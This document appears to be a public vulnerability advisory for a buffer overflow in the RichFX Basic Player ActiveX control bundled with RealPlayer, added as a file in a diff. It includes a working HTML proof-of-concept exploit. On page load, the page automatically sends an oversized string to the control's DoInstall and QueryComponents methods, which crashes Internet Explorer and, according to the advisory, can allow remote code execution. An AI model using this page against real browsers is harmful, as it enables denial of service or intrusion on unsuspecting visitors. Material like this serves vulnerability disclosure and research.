@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/26573/info
+
+RichFX Basic Player ActiveX Control is prone a buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.
+
+Successfully exploiting these issues allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.
+
+Note that RichFX Player ActiveX Control is installed by default with RealNetworks RealPlayer. It may be shipped with other RealNetworks products as well. 
+
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+    function Check() {
+    var s = "AAAA";
+
+    while (s.length < 999999) s=s+s;
+
+     var obj = new ActiveXObject("RFXInstMgr.RFXInstMgr"); //{47F59200-8783-11D2-8343-00A0C945A819}
+
+
+     obj.DoInstall(s);
+     obj.QueryComponents(s);
+
+   }
+  </script>
+
+ </head>
+ <body onload="JavaScript: return Check();">
+
+ </body>
+</html>
